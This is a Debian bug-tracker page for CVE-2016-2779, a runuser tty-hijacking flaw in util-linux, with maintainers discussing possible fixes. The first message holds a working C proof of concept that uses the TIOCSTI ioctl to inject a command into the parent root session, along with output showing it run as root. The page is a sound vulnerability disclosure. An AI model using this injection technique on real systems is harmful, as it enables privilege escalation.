<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<link rel="icon" href="/favicon.png">
<title>#815922 - util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl - Debian Bug report logs</title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/css/bugs.css" type="text/css">

<link rel="canonical" href="&lt;a href=&quot;bugreport.cgi?bug=815922&quot;&gt;815922&lt;/a&gt;">
<script type="text/javascript">
<!--
function toggle_infmessages()
{
        allDivs=document.getElementsByTagName("div");
        for (var i = 0 ; i < allDivs.length ; i++ )
        {
                if (allDivs[i].className == "infmessage")
                {
                        allDivs[i].style.display=(allDivs[i].style.display == 'none' | allDivs[i].style.display == '') ? 'block' : 'none';
                }
        }
}
-->
</script>
</head>
<body>
<h1>Debian Bug report logs - 
<a href="mailto:815922@bugs.debian.org">#815922</a><br>
util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl</h1>
<div class="versiongraph"><a href="version.cgi?fixed=2.31.1-0.1;package=util-linux;absolute=0;found=util-linux%2F2.24.2-1;collapse=1;info=1"><img alt="version graph" src="version.cgi?found=util-linux%2F2.24.2-1;package=util-linux;width=2;fixed=2.31.1-0.1;absolute=0;height=2;collapse=1"></a></div>
<div class="pkginfo">
  <p>Package:
     <a class="submitter" href="pkgreport.cgi?package=util-linux">util-linux</a>;
Maintainer for <a href="pkgreport.cgi?package=util-linux">util-linux</a> is <a href="pkgreport.cgi?maint=util-linux%40packages.debian.org">util-linux packagers &lt;util-linux@packages.debian.org&gt;</a>; Source for <a href="pkgreport.cgi?package=util-linux">util-linux</a> is <a href="pkgreport.cgi?src=util-linux">src:util-linux</a> (<a href="https://tracker.debian.org/pkg/util-linux">PTS</a>, <a href="https://buildd.debian.org/util-linux">buildd</a>, <a href="https://qa.debian.org/popcon.php?package=util-linux">popcon</a>). </p>

</div>

<div class="buginfo">
  <p>Reported by: <a href="pkgreport.cgi?submitter=up201407890%40alunos.dcc.fc.up.pt">up201407890@alunos.dcc.fc.up.pt</a></p>
  <p>Date: Thu, 25 Feb 2016 18:54:02 UTC</p>

<p>Severity: important</p>
<p>Tags: security, upstream</p>

<p>Found in version util-linux/2.24.2-1</p>
<p>Fixed in version 2.31.1-0.1</p>

<p><strong>Done:</strong> Chris Hofstaedtler &lt;zeha@debian.org&gt;</p>

<p>Bug is archived. No further changes may be made.<p></div>

<p><a href="javascript:toggle_infmessages();">Toggle useless messages</a></p><div class="msgreceived"><p>View this report as an <a href="bugreport.cgi?bug=815922;mbox=yes">mbox folder</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;mboxstatus=yes">status mbox</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;mboxmaint=yes">maintainer mbox</a></p></div>

<div class="infmessage"><hr><p>
<a name="1"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456426446 -->
<strong>Report forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Thu, 25 Feb 2016 18:54:06 GMT) (<a href="bugreport.cgi?bug=815922;msg=2">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=2">mbox</a>, <a href="#1">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="3"></a>
<!-- request_addr: up201407890@alunos.dcc.fc.up.pt -->
<!-- time:1456426446 -->
<strong>Acknowledgement sent</strong>
to <code>up201407890@alunos.dcc.fc.up.pt</code>:<br>
New Bug report received and forwarded.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Thu, 25 Feb 2016 18:54:06 GMT) (<a href="bugreport.cgi?bug=815922;msg=4">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=4">mbox</a>, <a href="#3">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="5"></a><a name="msg5"></a><a href="#5">Message #5</a> received at submit@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=5">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=5">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E&amp;body=On%20Thu%2C%2025%20Feb%202016%2019%3A51%3A23%20%2B0100%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20Package%3A%20util-linux%0A%3E%20Version%3A%20all%0A%3E%20Severity%3A%20important%0A%3E%20%0A%3E%20%0A%3E%20When%20executing%20a%20program%20via%20%22runuser%20-u%20nonpriv%20program%22%20the%0A%3E%20nonpriv%20session%20can%0A%3E%20escape%20to%20the%20parent%20session%20by%20using%20the%20TIOCSTI%20ioctl%20to%20push%0A%3E%20characters%20into%20the%0A%3E%20terminal%27s%20input%20buffer%2C%20allowing%20privilege%20escalation.%0A%3E%20This%20issue%20has%20been%20fixed%20in%20%22su%22%20by%20calling%20setsid%28%29%20and%20in%20%22sudo%22%20by%0A%3E%20using%20the%20%22use_pty%22%20flag%0A%3E%20%0A%3E%20%23%20cat%20test.c%0A%3E%20%23include%20%3Csys%2Fioctl.h%3E%0A%3E%20%0A%3E%20int%20main%28%29%0A%3E%20%7B%0A%3E%20%20%20%20char%20%2Acmd%20%3D%20%22id%5Cn%22%3B%0A%3E%20%20%20%20while%28%2Acmd%29%0A%3E%20%20%20%20%20ioctl%280%2C%20TIOCSTI%2C%20cmd%2B%2B%29%3B%0A%3E%20%7D%0A%3E%20%0A%3E%20%23%20gcc%20test.c%20-o%20test%0A%3E%20%23%20id%20saken%0A%3E%20uid%3D1000%28saken%29%20gid%3D1000%28saken%29%20groups%3D1000%28saken%29%0A%3E%20%0A%3E%20%23%20runuser%20-u%20saken%20.%2Ftest%20---%3E%20last%20command%20i%20type%20in%0A%3E%20id%0A%3E%20%23%20id%20---%3E%20did%20not%20type%20this%0A%3E%20uid%3D0%28root%29%20gid%3D0%28root%29%20groups%3D0%28root%29%0A%3E%20%0A%3E%20%0A%3E%20Thanks%2C%0A%3E%20Federico%20Bento%0A%3E%20%0A%3E%20----------------------------------------------------------------%0A%3E%20This%20message%20was%20sent%20using%20IMP%2C%20the%20Internet%20Messaging%20Program.%0A%3E%20%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E&amp;subject=Re%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt" alt="">
<div class="header"><span class="headerfield">From:</span> up201407890@alunos.dcc.fc.up.pt</div>
<div class="header"><span class="headerfield">To:</span> submit@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Thu, 25 Feb 2016 19:51:23 +0100</div>
</div>
<pre class="message flowed">Package: util-linux
Version: all
Severity: important


When executing a program via &quot;runuser -u nonpriv program&quot; the
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push
characters into the
terminal&#39;s input buffer, allowing privilege escalation.
This issue has been fixed in &quot;su&quot; by calling setsid() and in &quot;sudo&quot; by
using the &quot;use_pty&quot; flag

# cat test.c
#include &lt;sys/ioctl.h&gt;

int main()
{
  char *cmd = &quot;id\n&quot;;
  while(*cmd)
   ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=1000(saken) gid=1000(saken) groups=1000(saken)

# runuser -u saken ./test ---&gt; last command i type in
id
# id ---&gt; did not type this
uid=0(root) gid=0(root) groups=0(root)


Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.




</pre>

<div class="infmessage"><hr><p>
<a name="6"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456499897 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Fri, 26 Feb 2016 15:18:17 GMT) (<a href="bugreport.cgi?bug=815922;msg=7">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=7">mbox</a>, <a href="#6">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="8"></a>
<!-- request_addr: Phil Susi &lt;psusi@ubuntu.com&gt; -->
<!-- time:1456499897 -->
<strong>Acknowledgement sent</strong>
to <code>Phil Susi &lt;psusi@ubuntu.com&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Fri, 26 Feb 2016 15:18:17 GMT) (<a href="bugreport.cgi?bug=815922;msg=9">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=9">mbox</a>, <a href="#8">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="10"></a><a name="msg10"></a><a href="#10">Message #10</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=10">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=10">mbox</a>, <a href="mailto:815922@bugs.debian.org?body=On%20Fri%2C%2026%20Feb%202016%2010%3A04%3A49%20-0500%20Phil%20Susi%20%3Cpsusi%40ubuntu.com%3E%20wrote%3A%0A%3E%20On%202%2F25%2F2016%201%3A51%20PM%2C%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20%3E%20When%20executing%20a%20program%20via%20%22runuser%20-u%20nonpriv%20program%22%20the%0A%3E%20%3E%20nonpriv%20session%20can%0A%3E%20%3E%20escape%20to%20the%20parent%20session%20by%20using%20the%20TIOCSTI%20ioctl%20to%20push%0A%3E%20%3E%20characters%20into%20the%0A%3E%20%3E%20terminal%27s%20input%20buffer%2C%20allowing%20privilege%20escalation.%0A%3E%20%3E%20This%20issue%20has%20been%20fixed%20in%20%22su%22%20by%20calling%20setsid%28%29%20and%20in%20%22sudo%22%20by%0A%3E%20%3E%20using%20the%20%22use_pty%22%20flag%0A%3E%20%0A%3E%20How%20does%20setsid%28%29%20help%20this%3F%20%20And%20wouldn%27t%20it%20break%20the%20ability%20to%20use%0A%3E%20ctrl-c%20and%20ctrl-z%20on%20the%20child%20program%20%28%20since%20the%20child%20won%27t%20have%20a%0A%3E%20controlling%20terminal%20%29%3F%20%20I%20would%20think%20the%20fix%20would%20be%20to%20simply%20flush%0A%3E%20the%20terminal%20input%20buffer%20after%20the%20child%20exits.%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D06991.9040609%40ubuntu.com%3E&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl&amp;In-Reply-To=%3C56D06991.9040609%40ubuntu.com%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com" alt="">
<div class="header"><span class="headerfield">From:</span> Phil Susi &lt;psusi@ubuntu.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> up201407890@alunos.dcc.fc.up.pt, 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Fri, 26 Feb 2016 10:04:49 -0500</div>
</div>
<pre class="message">On 2/25/2016 1:51 PM, up201407890@alunos.dcc.fc.up.pt wrote:
&gt; When executing a program via &quot;runuser -u nonpriv program&quot; the
&gt; nonpriv session can
&gt; escape to the parent session by using the TIOCSTI ioctl to push
&gt; characters into the
&gt; terminal&#39;s input buffer, allowing privilege escalation.
&gt; This issue has been fixed in &quot;su&quot; by calling setsid() and in &quot;sudo&quot; by
&gt; using the &quot;use_pty&quot; flag

How does setsid() help this?  And wouldn&#39;t it break the ability to use
ctrl-c and ctrl-z on the child program ( since the child won&#39;t have a
controlling terminal )?  I would think the fix would be to simply flush
the terminal input buffer after the child exits.


</pre>

<div class="msgreceived"><hr><p>
<a name="11"></a>
<!-- command:found -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1456555869 -->
<!-- new_data:
$new_data = {
              &#39;found_versions&#39; =&gt; []
            };
-->
<!-- old_data:
$old_data = {
              &#39;found_versions&#39; =&gt; [
                                    &#39;all&#39;
                                  ]
            };
-->
<strong>No longer marked as found in versions all.</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Sat, 27 Feb 2016 06:51:09 GMT) (<a href="bugreport.cgi?bug=815922;msg=12">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=12">mbox</a>, <a href="#11">link</a>).</p></p></div>

<div class="msgreceived"><hr><p>
<a name="13"></a>
<!-- command:tag -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1456555874 -->
<!-- new_data:
$new_data = {
              &#39;keywords&#39; =&gt; &#39;security&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;keywords&#39; =&gt; &#39;&#39;
            };
-->
<strong>Added tag(s) security.</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Sat, 27 Feb 2016 06:51:14 GMT) (<a href="bugreport.cgi?bug=815922;msg=14">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=14">mbox</a>, <a href="#13">link</a>).</p></p></div>

<div class="msgreceived"><hr><p>
<a name="15"></a>
<!-- command:found -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1456556583 -->
<!-- new_data:
$new_data = {
              &#39;found_versions&#39; =&gt; [
                                    &#39;util-linux/2.24.2-1&#39;
                                  ]
            };
-->
<!-- old_data:
$old_data = {
              &#39;found_versions&#39; =&gt; []
            };
-->
<strong>Marked as found in versions util-linux/2.24.2-1.</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Sat, 27 Feb 2016 07:03:03 GMT) (<a href="bugreport.cgi?bug=815922;msg=16">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=16">mbox</a>, <a href="#15">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="17"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456567023 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Sat, 27 Feb 2016 09:57:03 GMT) (<a href="bugreport.cgi?bug=815922;msg=18">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=18">mbox</a>, <a href="#17">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="19"></a>
<!-- request_addr: up201407890@alunos.dcc.fc.up.pt -->
<!-- time:1456567023 -->
<strong>Acknowledgement sent</strong>
to <code>up201407890@alunos.dcc.fc.up.pt</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Sat, 27 Feb 2016 09:57:03 GMT) (<a href="bugreport.cgi?bug=815922;msg=20">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=20">mbox</a>, <a href="#19">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="21"></a><a name="msg21"></a><a href="#21">Message #21</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=21">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=21">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C20160227102337.109716vu4j3dq69w%40webmail.alunos.dcc.fc.up.pt%3E&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl&amp;body=On%20Sat%2C%2027%20Feb%202016%2010%3A23%3A37%20%2B0100%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20Quoting%20%22Phil%20Susi%22%20%3Cpsusi%40ubuntu.com%3E%3A%0A%3E%20%0A%3E%20%3E%20How%20does%20setsid%28%29%20help%20this%3F%20%20And%20wouldn%27t%20it%20break%20the%20ability%20to%20use%0A%3E%20%3E%20ctrl-c%20and%20ctrl-z%20on%20the%20child%20program%20%28%20since%20the%20child%20won%27t%20have%20a%0A%3E%20%3E%20controlling%20terminal%20%29%3F%20%20I%20would%20think%20the%20fix%20would%20be%20to%20simply%20flush%0A%3E%20%3E%20the%20terminal%20input%20buffer%20after%20the%20child%20exits.%0A%3E%20%3E%0A%3E%20%0A%3E%20Hello%20Phil%2C%0A%3E%20%0A%3E%20Most%20of%20your%20questions%20are%20answered%20here%3A%0A%3E%20https%3A%2F%2Fbugzilla.redhat.com%2Fshow_bug.cgi%3Fid%3D173008%0A%3E%20%0A%3E%20And%20yes%2C%20there%20would%20be%20no%20job%20control%20if%20you%20started%20a%20shell%20from%20%20%0A%3E%20there.%20This%20is%20why%20in%20%22su%22%20setsid%28%29%20is%20called%20only%20with%20%22-c%22%2C%20%20%0A%3E%20partially%20fixing%20the%20issue.%20If%20one%20would%20to%20%22su%20-%20user%22%20it%20would%20still%20%20%0A%3E%20be%20vulnerable.%0A%3E%20%0A%3E%20http%3A%2F%2Fwww.openwall.com%2Flists%2Foss-security%2F2016%2F02%2F25%2F6%0A%3E%20%0A%3E%20The%20same%20pkexec%20issue%20got%20assigned%20CVE-2016-2568%20yesterday%2C%20if%20you%20%20%0A%3E%20read%20my%20PS%3A%20%22I%20don%27t%20believe%20any%20of%20the%20previous%20mentions%20of%20fixes%20for%20%20%0A%3E%20%22su%22%20and%0A%3E%20%22sudo%22%20would%20work%20here%2C%20since%20executing%20a%20shell%20via%20pkexec%20would%20make%20it%20not%0A%3E%20have%20job%20control.%22%0A%3E%20%0A%3E%20%0A%3E%20----------------------------------------------------------------%0A%3E%20This%20message%20was%20sent%20using%20IMP%2C%20the%20Internet%20Messaging%20Program.%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%09%3C56D06991.9040609%40ubuntu.com%3E%0A%20%3C20160227102337.109716vu4j3dq69w%40webmail.alunos.dcc.fc.up.pt%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt" alt="">
<div class="header"><span class="headerfield">From:</span> up201407890@alunos.dcc.fc.up.pt</div>
<div class="header"><span class="headerfield">To:</span> &quot;Phil Susi&quot; &lt;psusi@ubuntu.com&gt;</div>
<div class="header"><span class="headerfield">Cc:</span> 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Sat, 27 Feb 2016 10:23:37 +0100</div>
</div>
<pre class="message flowed">Quoting &quot;Phil Susi&quot; &lt;psusi@ubuntu.com&gt;:

&gt; How does setsid() help this?  And wouldn&#39;t it break the ability to use
&gt; ctrl-c and ctrl-z on the child program ( since the child won&#39;t have a
&gt; controlling terminal )?  I would think the fix would be to simply flush
&gt; the terminal input buffer after the child exits.
&gt;

Hello Phil,

Most of your questions are answered here:
<a href="https://bugzilla.redhat.com/show_bug.cgi?id=173008">https://bugzilla.redhat.com/show_bug.cgi?id=173008</a>

And yes, there would be no job control if you started a shell from  
there. This is why in &quot;su&quot; setsid() is called only with &quot;-c&quot;,  
partially fixing the issue. If one would to &quot;su - user&quot; it would still  
be vulnerable.

<a href="http://www.openwall.com/lists/oss-security/2016/02/25/6">http://www.openwall.com/lists/oss-security/2016/02/25/6</a>

The same pkexec issue got assigned <a href="https://security-tracker.debian.org/tracker/CVE-2016-2568">CVE-2016-2568</a> yesterday, if you  
read my PS: &quot;I don&#39;t believe any of the previous mentions of fixes for  
&quot;su&quot; and
&quot;sudo&quot; would work here, since executing a shell via pkexec would make it not
have job control.&quot;


----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.



</pre>

<div class="msgreceived"><hr><p>
<a name="22"></a>
<!-- command:tag -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1456589893 -->
<!-- new_data:
$new_data = {
              &#39;keywords&#39; =&gt; &#39;upstream security&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;keywords&#39; =&gt; &#39;security&#39;
            };
-->
<strong>Added tag(s) upstream.</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Sat, 27 Feb 2016 16:18:13 GMT) (<a href="bugreport.cgi?bug=815922;msg=23">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=23">mbox</a>, <a href="#22">link</a>).</p></p></div>

<div class="msgreceived"><hr><p>
<a name="24"></a>
<!-- command:title -->
<!-- requester: Salvatore Bonaccorso &lt;carnil@debian.org&gt; -->
<!-- request_addr: control@bugs.debian.org -->
<!-- time:1456589894 -->
<!-- new_data:
$new_data = {
              &#39;subject&#39; =&gt; &#39;util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl&#39;
            };
-->
<!-- old_data:
$old_data = {
              &#39;subject&#39; =&gt; &#39;runuser tty hijacking via TIOCSTI ioctl&#39;
            };
-->
<strong>Changed Bug title to &#39;util-linux: CVE-2016-2779: runuser tty hijacking via TIOCSTI ioctl&#39; from &#39;runuser tty hijacking via TIOCSTI ioctl&#39;</strong>
Request was from <code>Salvatore Bonaccorso &lt;carnil@debian.org&gt;</code>
to <code>control@bugs.debian.org</code>.
 (Sat, 27 Feb 2016 16:18:14 GMT) (<a href="bugreport.cgi?bug=815922;msg=25">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=25">mbox</a>, <a href="#24">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="26"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456757474 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Mon, 29 Feb 2016 14:51:14 GMT) (<a href="bugreport.cgi?bug=815922;msg=27">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=27">mbox</a>, <a href="#26">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="28"></a>
<!-- request_addr: Phil Susi &lt;psusi@ubuntu.com&gt; -->
<!-- time:1456757474 -->
<strong>Acknowledgement sent</strong>
to <code>Phil Susi &lt;psusi@ubuntu.com&gt;</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Mon, 29 Feb 2016 14:51:14 GMT) (<a href="bugreport.cgi?bug=815922;msg=29">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=29">mbox</a>, <a href="#28">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="30"></a><a name="msg30"></a><a href="#30">Message #30</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=30">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=30">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C56D459E8.9000307%40ubuntu.com%3E&amp;subject=Re%3A%20Bug%23815922%3A%20runuser%20tty%20hijacking%20via%20TIOCSTI%20ioctl&amp;body=On%20Mon%2C%2029%20Feb%202016%2009%3A47%3A04%20-0500%20Phil%20Susi%20%3Cpsusi%40ubuntu.com%3E%20wrote%3A%0A%3E%20On%202%2F27%2F2016%204%3A23%20AM%2C%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20%3E%20And%20yes%2C%20there%20would%20be%20no%20job%20control%20if%20you%20started%20a%20shell%20from%0A%3E%20%3E%20there.%20This%20is%20why%20in%20%22su%22%20setsid%28%29%20is%20called%20only%20with%20%22-c%22%2C%20partially%0A%3E%20%3E%20fixing%20the%20issue.%20If%20one%20would%20to%20%22su%20-%20user%22%20it%20would%20still%20be%20vulnerable.%0A%3E%20%0A%3E%20That%20isn%27t%20good.%20%20Shouldn%27t%20only%20the%20foreground%20process%20group%20be%20allowed%0A%3E%20to%20use%20this%20ioctl%2C%20thus%20preventing%20any%20background%20forked%20processes%20from%0A%3E%20exploiting%20this%3F%0A%3E%20%0A%3E%20%0A%3E%20%0A&amp;References=%3C20160225195123.16045jftg2ztsn40%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D06991.9040609%40ubuntu.com%3E%0A%20%3C20160227102337.109716vu4j3dq69w%40webmail.alunos.dcc.fc.up.pt%3E%0A%20%3C56D459E8.9000307%40ubuntu.com%3E">reply</a>):</p>
<div class="headers">
<img src="/cgi-bin/libravatar.cgi?email=psusi%40ubuntu.com" alt="">
<div class="header"><span class="headerfield">From:</span> Phil Susi &lt;psusi@ubuntu.com&gt;</div>
<div class="header"><span class="headerfield">To:</span> up201407890@alunos.dcc.fc.up.pt</div>
<div class="header"><span class="headerfield">Cc:</span> 815922@bugs.debian.org</div>
<div class="header"><span class="headerfield">Subject:</span> Re: Bug#815922: runuser tty hijacking via TIOCSTI ioctl</div>
<div class="header"><span class="headerfield">Date:</span> Mon, 29 Feb 2016 09:47:04 -0500</div>
</div>
<pre class="message">On 2/27/2016 4:23 AM, up201407890@alunos.dcc.fc.up.pt wrote:
&gt; And yes, there would be no job control if you started a shell from
&gt; there. This is why in &quot;su&quot; setsid() is called only with &quot;-c&quot;, partially
&gt; fixing the issue. If one would to &quot;su - user&quot; it would still be vulnerable.

That isn&#39;t good.  Shouldn&#39;t only the foreground process group be allowed
to use this ioctl, thus preventing any background forked processes from
exploiting this?



</pre>

<div class="infmessage"><hr><p>
<a name="31"></a>
<!-- request_addr: debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt; -->
<!-- time:1456770787 -->
<strong>Information forwarded</strong>
to <code>debian-bugs-dist@lists.debian.org, Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>:<br>
<code>Bug#815922</code>; Package <code>util-linux</code>.
 (Mon, 29 Feb 2016 18:33:07 GMT) (<a href="bugreport.cgi?bug=815922;msg=32">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=32">mbox</a>, <a href="#31">link</a>).</p></p></div>

<div class="infmessage"><hr><p>
<a name="33"></a>
<!-- request_addr: up201407890@alunos.dcc.fc.up.pt -->
<!-- time:1456770787 -->
<strong>Acknowledgement sent</strong>
to <code>up201407890@alunos.dcc.fc.up.pt</code>:<br>
Extra info received and forwarded to list.  Copy sent to <code>Debian util-linux Maintainers &lt;ah-util-linux@debian.org&gt;</code>.
 (Mon, 29 Feb 2016 18:33:07 GMT) (<a href="bugreport.cgi?bug=815922;msg=34">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=34">mbox</a>, <a href="#33">link</a>).</p></p></div>

<hr><p class="msgreceived"><a name="35"></a><a name="msg35"></a><a href="#35">Message #35</a> received at 815922@bugs.debian.org (<a href="bugreport.cgi?bug=815922;msg=35">full text</a>, <a href="bugreport.cgi?bug=815922;mbox=yes;msg=35">mbox</a>, <a href="mailto:815922@bugs.debian.org?In-Reply-To=%3C20160229192950.19073lpxipzw8vms%40webmail.alunos.dcc.fc.up.pt%3E&amp;body=On%20Mon%2C%2029%20Feb%202016%2019%3A29%3A50%20%2B0100%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20Quoting%20%22Phil%20Susi%22%20%3Cpsusi%40ubuntu.com%3E%3A%0A%3E%20%0A%3E%20%3E%20On%202%2F27%2F2016%204%3A23%20AM%2C%20up201407890%40alunos.dcc.fc.up.pt%20wrote%3A%0A%3E%20%3E%3E%20And%20yes%2C%20there%20would%20be%20no%20job%20control%20if%20you%20started%20a%20shell%20from%0A%3E%20%3E%3E%20there.%20This%20is%20why%20in%20%22su%22%20setsid%28%29%20is%20called%20only%20with%20%22-c%22%2C%20partially%0A%3E%20%3E%3E%20fixing%20the%20issue.%20If%20one%20would%20to%20%22su%20-%20user%22%20it%20would%20still%20be%20vulnerable.%0A%3E%20%3E%0A%3E%20%3E%20That%20isn%27t%20good.%20%20Shouldn%27t%20only%20the%20foreground%20process%20group%20be%20allowed%0A%3E%20%3E%20to%20use%20this%20ioctl%2C%20thus%20preventing%20any%20background%20forked%20processes%20from%0A%3E%20%3E%20exploiting%20this%3F%0A%3E%20%0A%3E%20I%20believe%20that%20is%20up%20to%20kernel%20developers.%0A%3E%20grsecurity%20released%20a%20new%20feature%20named%20GRKERNSEC_HAR